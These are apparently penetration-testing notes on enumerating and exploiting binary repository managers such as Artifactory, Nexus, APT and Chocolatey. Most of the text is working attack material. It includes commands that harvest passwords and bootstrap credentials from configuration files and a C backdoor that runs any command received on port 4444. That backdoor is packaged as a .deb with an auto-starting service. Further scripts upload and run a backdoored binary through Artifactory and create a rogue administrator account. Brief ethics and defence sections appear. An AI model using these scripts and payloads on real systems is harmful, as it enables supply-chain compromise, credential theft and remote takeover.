Binary software managers, such as Artifactory, Nexus, or GitHub Packages, manage and store artifacts, packages, and binaries in development environments. Below are examples of popular binary software managers for Windows and Linux, along with methods to enumerate and potentially exploit them using appropriate tools.

### **Binary Software Managers**

#### **Windows:**
1. **Artifactory**
2. **Nexus Repository Manager**
3. **GitHub Packages**
4. **Chocolatey**
5. **NuGet**
6. **ProGet**

#### **Linux:**
1. **Artifactory**
2. **Nexus Repository Manager**
3. **GitHub Packages**
4. **Yum**
5. **APT**
6. **RPM**

---

### **Enumeration and Exploitation Techniques**

#### **1. Artifactory (Windows & Linux)**
- **Enumeration:**
  - **Check for Artifactory Service:**
    - Windows:
      ```powershell
      Get-Service -Name *artifactory*
      ```
    - Linux:
      ```bash
      systemctl status artifactory
      ```
  - **Identify Artifactory Configuration Files:**
    - Windows:
      ```powershell
      Get-ChildItem -Path "C:\Program Files\JFrog\Artifactory\etc\*" -Recurse | Select-String -Pattern "password" -SimpleMatch
      ```
    - Linux:
      ```bash
      grep -i "password" /etc/opt/jfrog/artifactory/* -r
      ```

- **Exploitation:**
  - **Extract Sensitive Information from Configuration Files:**
    - Windows:
      ```powershell
      Get-Content "C:\Program Files\JFrog\Artifactory\etc\security\access\bootstrap.creds" | Out-String
      ```
    - Linux:
      ```bash
      cat /etc/opt/jfrog/artifactory/security/access/bootstrap.creds
      ```
  - **Using Exploit Tools:**
    - **JFrog CLI**: Use JFrog CLI to interact with the repository, upload/download artifacts, or explore repositories:
      ```bash
      jfrog rt u <file> <repository-path>
      ```

#### **2. Nexus Repository Manager (Windows & Linux)**
- **Enumeration:**
  - **Check for Nexus Service:**
    - Windows:
      ```powershell
      Get-Service -Name *nexus*
      ```
    - Linux:
      ```bash
      systemctl status nexus
      ```
  - **Identify Nexus Configuration Files:**
    - Windows:
      ```powershell
      Get-ChildItem -Path "C:\Nexus\sonatype-work\nexus3\etc\*" -Recurse | Select-String -Pattern "password" -SimpleMatch
      ```
    - Linux:
      ```bash
      grep -i "password" /opt/sonatype/nexus3/etc/* -r
      ```

- **Exploitation:**
  - **Extract Sensitive Information:**
    - Windows:
      ```powershell
      Get-Content "C:\Nexus\sonatype-work\nexus3\etc\nexus.properties" | Out-String
      ```
    - Linux:
      ```bash
      cat /opt/sonatype/nexus3/etc/nexus.properties
      ```
  - **Exploit Tools:**
    - **cURL**: Use cURL to interact with Nexus API for accessing repositories:
      ```bash
      curl -u admin:admin123 -X GET "http://<nexus_url>:8081/service/rest/v1/search/assets?repository=<repository_name>"
      ```

#### **3. GitHub Packages (Windows & Linux)**
- **Enumeration:**
  - **Identify GitHub Repositories:**
    - Windows & Linux:
      ```bash
      curl -s -H "Authorization: token <YOUR_GITHUB_TOKEN>" https://api.github.com/user/repos | jq '.[] | .full_name'
      ```

- **Exploitation:**
  - **Download and Analyze Packages:**
    - Windows & Linux:
      ```bash
      curl -u "username:token" -L "https://<repository-url>/releases/download/<release-tag>/<package>.zip" -o <package>.zip
      ```
  - **Check for Credential Leaks in Packages:**
    - Windows & Linux:
      ```bash
      unzip -p <package>.zip | grep -i "password"
      ```

#### **4. Yum/APT/RPM (Linux)**
- **Enumeration:**
  - **List Installed Packages:**
    - Yum:
      ```bash
      yum list installed
      ```
    - APT:
      ```bash
      dpkg -l
      ```
    - RPM:
      ```bash
      rpm -qa
      ```

- **Exploitation:**
  - **Find and Exploit Vulnerable Packages:**
    - Check for known vulnerabilities:
      ```bash
      yum check-update
      apt-get update
      rpm -q --changelog <package_name> | grep -i "cve"
      ```
  - **Install Malicious Packages:**
    - Use a compromised repository to push malicious updates.

#### **5. Chocolatey/NuGet/ProGet (Windows)**
- **Enumeration:**
  - **List Installed Packages:**
    - Chocolatey:
      ```powershell
      choco list --local-only
      ```
    - NuGet:
      ```powershell
      Get-Package
      ```

- **Exploitation:**
  - **Install Malicious Packages:**
    - Use a compromised Chocolatey/NuGet server to push malicious packages.
      ```powershell
      choco install malicious-package
      ```

---

### **Key Exploitation Techniques**
- **Configuration File Extraction**: Many binary software managers store sensitive information like passwords and API keys in configuration files. Searching and extracting these files can reveal exploitable information.
- **API Exploitation**: Using tools like `cURL`, you can interact with the APIs of these managers to list or manipulate packages, potentially leading to exploitation.
- **Binary Analysis**: Download and analyze binaries/packages from these repositories to identify backdoors or vulnerabilities.
- **Privilege Escalation**: Misconfigured services or files can allow privilege escalation, either by modifying existing binaries or replacing them with malicious ones.

These techniques and tools provide a comprehensive approach to enumerating and exploiting binary software managers on both Windows and Linux systems.

## Apt package compromise

Yes, you can create a package using APT (Advanced Package Tool) that installs an exploitable service on a Linux system, which could facilitate lateral movement within a network. Below are the steps and considerations for doing this:

### **Steps to Create a Malicious APT Package**

#### 1. **Set Up the Environment**
   - **Install Required Tools:**
     ```bash
     sudo apt-get install dh-make devscripts build-essential fakeroot
     ```

   - **Create a Working Directory:**
     ```bash
     mkdir ~/malicious-package
     cd ~/malicious-package
     ```

#### 2. **Create the Package Structure**
   - **Initialize the Package:**
     ```bash
     dh_make --createorig -s -p malicious-service_1.0
     ```

   - This command initializes the package with the name `malicious-service` and version `1.0`.

#### 3. **Add the Exploitable Service**
   - **Create a Simple Vulnerable Service:**
     - For example, you could create a service that listens on a network port and allows unauthenticated remote command execution:
     - Create a `malicious-service.c` file:
       ```c
       #include <stdio.h>
       #include <stdlib.h>
       #include <unistd.h>
       #include <sys/socket.h>
       #include <netinet/in.h>

       int main() {
           int sockfd, new_sock;
           struct sockaddr_in serv_addr, cli_addr;
           char buffer[1024];
           sockfd = socket(AF_INET, SOCK_STREAM, 0);
           serv_addr.sin_family = AF_INET;
           serv_addr.sin_addr.s_addr = INADDR_ANY;
           serv_addr.sin_port = htons(4444);

           bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
           listen(sockfd, 5);
           new_sock = accept(sockfd, (struct sockaddr *) &cli_addr, (socklen_t *) &cli_addr);

           while (1) {
               read(new_sock, buffer, 1024);
               system(buffer);
           }

           return 0;
       }
       ```

   - **Compile the Service:**
     ```bash
     gcc malicious-service.c -o malicious-service
     ```

   - **Set Up the Service in the Package:**
     - Place the binary in the package structure:
       ```bash
       mkdir -p debian/malicious-service/usr/bin
       cp malicious-service debian/malicious-service/usr/bin/
       ```

   - **Create a Systemd Service File:**
     - Add a systemd service file to start the service automatically:
       ```bash
       mkdir -p debian/malicious-service/lib/systemd/system/
       echo "[Unit]
       Description=Malicious Service

       [Service]
       ExecStart=/usr/bin/malicious-service

       [Install]
       WantedBy=multi-user.target" > debian/malicious-service/lib/systemd/system/malicious-service.service
       ```

#### 4. **Build the APT Package**
   - **Control File Configuration:**
     - Edit the `debian/control` file to configure the package metadata.
       ```text
       Source: malicious-service
       Section: misc
       Priority: optional
       Maintainer: Your Name <your.email@example.com>
       Build-Depends: debhelper (>= 9)
       Standards-Version: 3.9.6
       Homepage: https://example.com

       Package: malicious-service
       Architecture: any
       Depends: ${shlibs:Depends}, ${misc:Depends}
       Description: A service that allows remote command execution
        This package installs a service that listens on a port and allows
        unauthenticated remote command execution.
       ```

   - **Build the Package:**
     ```bash
     dpkg-buildpackage -us -uc
     ```

   - This command creates a `.deb` package that can be installed on any Debian-based system.

#### 5. **Deploy and Exploit**
   - **Install the Package:**
     ```bash
     sudo dpkg -i ../malicious-service_1.0_amd64.deb
     ```

   - **Verify the Service is Running:**
     ```bash
     systemctl status malicious-service
     ```

   - **Exploit the Service:**
     - From another machine, connect to the service and execute commands:
       ```bash
       echo "whoami" | nc <target-ip> 4444
       ```

### **Considerations and Ethical Concerns**
- **Ethical Use**: Ensure that creating and deploying such a package is done in a controlled and legal environment, such as for educational purposes, penetration testing with permission, or in a lab environment.
- **Detection and Prevention**: Be aware that deploying such packages can be detected by security systems, and building malicious packages is illegal in production environments without explicit authorization.

### **Defensive Measures**
- **Package Signing**: Use signed packages to prevent unauthorized package installations.
- **Monitoring**: Implement logging and monitoring to detect suspicious service installations and activity.
- **Package Verification**: Regularly verify installed packages against known good sources to detect tampering.

This process demonstrates how a malicious APT package could be used to install an exploitable service that could facilitate lateral movement within a network. However, it should only be used responsibly and legally.

## Artifactory

Yes, there are scripts and methods to enumerate Artifactory instances to identify misconfigurations, users, and passwords. Artifactory, being a binary repository manager, can hold sensitive information such as credentials, tokens, and configuration details. Below are some methods and tools to enumerate and exploit Artifactory:

### **1. Enumeration Scripts**

#### **Python Script for Artifactory Enumeration**
This Python script can be used to enumerate users, repositories, and potential misconfigurations in an Artifactory instance.

```python
import requests
from requests.auth import HTTPBasicAuth

# Configuration
artifactory_url = 'http://your-artifactory-instance/artifactory'
username = 'your-username'
password = 'your-password'

# Headers for requests
headers = {
    'Content-Type': 'application/json',
}

# Function to check for users
def enumerate_users():
    url = f'{artifactory_url}/api/security/users'
    response = requests.get(url, auth=HTTPBasicAuth(username, password), headers=headers)
    if response.status_code == 200:
        users = response.json()
        print("[+] Found the following users:")
        for user in users:
            print(f" - {user['name']}")
    else:
        print(f"[-] Failed to enumerate users: {response.status_code}")

# Function to check for repositories
def enumerate_repos():
    url = f'{artifactory_url}/api/repositories'
    response = requests.get(url, auth=HTTPBasicAuth(username, password), headers=headers)
    if response.status_code == 200:
        repos = response.json()
        print("[+] Found the following repositories:")
        for repo in repos:
            print(f" - {repo['key']} ({repo['type']})")
    else:
        print(f"[-] Failed to enumerate repositories: {response.status_code}")

# Function to check for passwords in configurations
def check_for_passwords():
    url = f'{artifactory_url}/api/system/configuration'
    response = requests.get(url, auth=HTTPBasicAuth(username, password), headers=headers)
    if response.status_code == 200:
        config = response.text
        if 'password' in config or 'secret' in config:
            print("[+] Possible passwords or secrets found in configuration:")
            print(config)
        else:
            print("[+] No passwords or secrets found in configuration.")
    else:
        print(f"[-] Failed to retrieve configuration: {response.status_code}")

# Run the functions
enumerate_users()
enumerate_repos()
check_for_passwords()
```

#### **Bash Script for Basic Artifactory Enumeration**
This Bash script uses `curl` to interact with the Artifactory API and can be run on any Unix-based system.

```bash
#!/bin/bash

# Configuration
ARTIFACTORY_URL="http://your-artifactory-instance/artifactory"
USERNAME="your-username"
PASSWORD="your-password"

# Function to check for users
enumerate_users() {
    echo "[+] Enumerating users..."
    curl -u $USERNAME:$PASSWORD -X GET "$ARTIFACTORY_URL/ui/api/v1/ui/users"
}

# Function to check for repositories
enumerate_repos() {
    echo "[+] Enumerating repositories..."
    curl -u $USERNAME:$PASSWORD -X GET "$ARTIFACTORY_URL/ui/api/v1/ui/repositories"
}

# Function to check for passwords in configurations
check_for_passwords() {
    echo "[+] Checking for passwords or secrets in configuration..."
    curl -u $USERNAME:$PASSWORD -X GET "$ARTIFACTORY_URL/api/system/configuration" | grep -i "password\|secret"
}

# Run the functions
enumerate_users
enumerate_repos
check_for_passwords
```

**Note:** Access Token is likely required

- script should be modified to reflect access tokens
```shell
curl 'http://192.168.232.40:8082/ui/api/v1/ui/users' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Cookie: <redacted>' -H 'Upgrade-Insecure-Requests: 1'
```

### **2. Tools for Artifactory Enumeration**

#### **Artifactory-Pwn**
Artifactory-Pwn is a tool that can enumerate Artifactory instances to identify potential vulnerabilities, extract sensitive data, and even exploit misconfigurations. This tool is typically used in penetration testing and security assessments.

- **GitHub Repository:** [Artifactory-Pwn](https://github.com/optiv/Artifactory-Pwn)

#### **JFrog CLI**
The JFrog CLI is an official tool provided by JFrog for interacting with Artifactory instances. While it’s primarily for legitimate use, it can also be used for enumeration purposes if credentials are available.

- **Enumerate Repositories:**
  ```bash
  jfrog rt repo-list
  ```

- **Enumerate Users:**
  ```bash
  jfrog rt users
  ```

### **3. Manual Enumeration**
You can manually enumerate Artifactory by interacting with its API directly using tools like `curl` or `Postman`. The API endpoints for Artifactory are well-documented and can provide a wealth of information.

### **Exploitation Pathways**
- **Misconfigured Repositories**: If repositories are publicly accessible or misconfigured, sensitive files, binaries, or credentials might be exposed.
- **Credentials in Configuration**: Artifactory configuration files or API responses might contain plaintext credentials or secrets that can be used to further compromise the instance.
- **Privilege Escalation**: If the credentials of an admin user are compromised, it could lead to full control over the Artifactory instance, including the ability to push malicious binaries or access internal systems.

### **Defensive Measures**
- **Harden Artifactory Configuration**: Ensure that repositories are properly secured, and sensitive information is not exposed in API responses or configuration files.
- **Regular Audits**: Regularly audit the Artifactory instance for misconfigurations, exposed credentials, and other security vulnerabilities.
- **Use Strong Authentication**: Implement strong authentication methods like multi-factor authentication (MFA) to protect access to Artifactory.

These scripts and methods provide a starting point for enumerating and potentially exploiting Artifactory instances. However, they should be used ethically and within the bounds of legal and authorized activities.

To interact with Artifactory using the REST API that requires a cookie-based access token (generated through the login page), you need to modify your approach slightly. Here's how you can adjust the scripts for both uploading a backdoored binary and downloading it on a target machine, considering the required cookie access token.

### 1. Obtain the Access Token
You need to log in to the Artifactory UI and capture the access token from the response headers or cookies.

#### **NOTE:** curl login doesn't work like this and requires json data like:
```json
{
"user":"username",
"password":"password",
"type":"login"
}
```
Examine how this works with Burp suite, Firefox, or other tool where you can intercept a login request via the webpage.
#### Example with `curl`:
```bash
# Log in to Artifactory and capture the access token
response=$(curl -X POST -c cookies.txt -d "username=<username>&password=<password>" "http://<artifactory_url>/ui/api/v1/ui/login")

# Extract the token (assuming it's stored in a cookie named 'access_token')
access_token=$(grep 'access_token' cookies.txt | awk '{print $7}')
```

The `cookies.txt` file will store the cookies, including the access token if it’s set as a cookie.

### 2. Upload the Backdoored Binary
Use the captured access token to authenticate the request.

#### Using `curl`:
```bash
curl -b cookies.txt -X PUT -T backdoored_app "http://<artifactory_url>/artifactory/<repo>/<path>/backdoored_app" -H "X-JFrog-Art-Api:$access_token"
```

### 3. Download the Backdoored Binary on the Target Machine
You can download the binary on the target machine using the cookie-based access token.

#### Using `curl`:
```bash
curl -b cookies.txt -O "http://<artifactory_url>/artifactory/<repo>/<path>/backdoored_app" -H "X-JFrog-Art-Api:$access_token"
chmod +x backdoored_app
./backdoored_app
```

### 4. Interact with the API
If you need to interact with other Artifactory REST API endpoints (like enumerating users), use the same cookie-based approach.

#### Example for Fetching Users:
```bash
curl -b cookies.txt "http://<artifactory_url>/ui/api/v1/ui/users" -H "X-JFrog-Art-Api:$access_token"
```

### 5. Automation Example Script
Here’s a script that logs in, uploads a backdoored binary, and downloads it to a target machine:

```bash
#!/bin/bash

# Define variables
artifactory_url="http://<artifactory_url>"
repo_path="<repo>/<path>"
username="<username>"
password="<password>"
binary_file="backdoored_app"

# Log in to Artifactory and capture the access token
curl -X POST -c cookies.txt -d "username=$username&password=$password" "$artifactory_url/ui/api/v1/ui/login"

# Extract the access token (if it's set as a cookie)
access_token=$(grep 'access_token' cookies.txt | awk '{print $7}')

# Upload the backdoored binary
curl -b cookies.txt -X PUT -T "$binary_file" "$artifactory_url/artifactory/$repo_path/$binary_file" -H "X-JFrog-Art-Api:$access_token"

# Download the backdoored binary on the target machine
curl -b cookies.txt -O "$artifactory_url/artifactory/$repo_path/$binary_file" -H "X-JFrog-Art-Api:$access_token"

# Make the binary executable and run it
chmod +x "$binary_file"
./"$binary_file"
```

### Key Considerations
- **Security:** Ensure that credentials and tokens are handled securely and not exposed in logs or script files.
- **Authorization:** Verify that the account used has the necessary permissions to upload and download artifacts and interact with the API.
- **Environment:** Be aware of any monitoring and security controls in place, as this type of activity could be flagged by security teams.

By modifying the script to handle the cookie-based authentication required by Artifactory, you can automate the process of uploading, downloading, and running a backdoored binary within an environment that requires this specific authentication mechanism.


Enumerating users, passwords, and other API endpoints in Artifactory, especially with the requirement of a cookie-based access token, involves careful use of the Artifactory API. Below is a detailed approach, including examples of how to automate this process using bash scripts.

### 1. **Login and Capture Access Token**
First, you must log in to Artifactory and capture the cookie-based access token.

```bash
# Log in to Artifactory and capture the cookies
curl -X POST -c cookies.txt -d "username=<username>&password=<password>" "http://<artifactory_url>/ui/api/v1/ui/login"

# (Optional) Extract the access token from cookies (if required)
access_token=$(grep 'access_token' cookies.txt | awk '{print $7}')
```

### 2. **Enumerating Users**
Use the API to list all users. Depending on your Artifactory version, the endpoint might differ.

```bash
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "http://<artifactory_url>/ui/api/v1/ui/users" -o users.json
```

#### Example Response:
```json
[
    {
        "name": "admin",
        "email": "admin@example.com",
        "groups": ["admins"]
    },
    {
        "name": "developer",
        "email": "dev@example.com",
        "groups": ["developers"]
    }
]
```

### 3. **Enumerating Passwords**
Artifactory may not expose passwords directly via the API. However, in some misconfigured setups or older versions, you might extract encoded passwords or API keys.

```bash
# Attempt to list API keys (if supported)
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "http://<artifactory_url>/api/security/apiKey" -o api_keys.json
```

### 4. **Exploring Other API Endpoints**
You can enumerate additional API endpoints to gather more information, such as repositories, groups, permissions, etc.

#### List Repositories:
```bash
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "http://<artifactory_url>/ui/api/v1/ui/repositories" -o repos.json
```

#### List Groups:
```bash
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "http://<artifactory_url>/ui/api/v1/ui/groups" -o groups.json
```

#### List Permissions:
```bash
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "http://<artifactory_url>/ui/api/v1/ui/permissions" -o permissions.json
```

### 5. **Automating Enumeration with a Script**
Here's a bash script that logs in, enumerates users, passwords, and other relevant information, and saves the results to files.

```bash
#!/bin/bash

# Define variables
artifactory_url="http://<artifactory_url>"
username="<username>"
password="<password>"

# Log in to Artifactory and capture cookies
curl -X POST -c cookies.txt -d "username=$username&password=$password" "$artifactory_url/ui/api/v1/ui/login"

# (Optional) Extract the access token from cookies
access_token=$(grep 'access_token' cookies.txt | awk '{print $7}')

# Enumerate users
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "$artifactory_url/ui/api/v1/ui/users" -o users.json

# Attempt to list API keys
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "$artifactory_url/api/security/apiKey" -o api_keys.json

# List repositories
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "$artifactory_url/ui/api/v1/ui/repositories" -o repos.json

# List groups
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "$artifactory_url/ui/api/v1/ui/groups" -o groups.json

# List permissions
curl -b cookies.txt -H "X-JFrog-Art-Api:$access_token" "$artifactory_url/ui/api/v1/ui/permissions" -o permissions.json

echo "Enumeration complete. Check JSON files for results."
```

### 6. **Exploiting Misconfigurations**
If the API returns sensitive data, such as API keys or misconfigured access controls, you can potentially escalate your privileges or access restricted resources.

### 7. **Creating a Secondary Administrator Account**
If you have sufficient permissions, you could add a new administrator account via the API.

```bash
curl -b cookies.txt -X POST -H "X-JFrog-Art-Api:$access_token" -H "Content-Type: application/json" -d '{
  "name": "newadmin",
  "email": "newadmin@example.com",
  "password": "Password123!",
  "groups": ["admins"]
}' "http://<artifactory_url>/ui/api/v1/ui/users"
```

### 8. **Handling the Default Derby Database**
If you discover Artifactory is using the default Derby database, you could potentially enumerate users by interacting directly with the database or querying the Artifactory API if access controls are lax.

#### Querying the Derby Database (Example):
If you have direct access to the Derby database, you can use JDBC tools to enumerate users.

```bash
# Using a JDBC tool to interact with the Derby database
java -cp /path/to/derby.jar:/path/to/derbytools.jar org.apache.derby.tools.ij <<EOF
CONNECT 'jdbc:derby:/path/to/artifactory/db;user=<db_user>;password=<db_password>';
SELECT * FROM users;
EOF
```

### Conclusion
This approach allows for comprehensive enumeration of an Artifactory instance by leveraging the API and exploiting any misconfigurations or exposed sensitive data. Scripts like these should be used carefully and ethically, ensuring you have proper authorization to conduct such activities.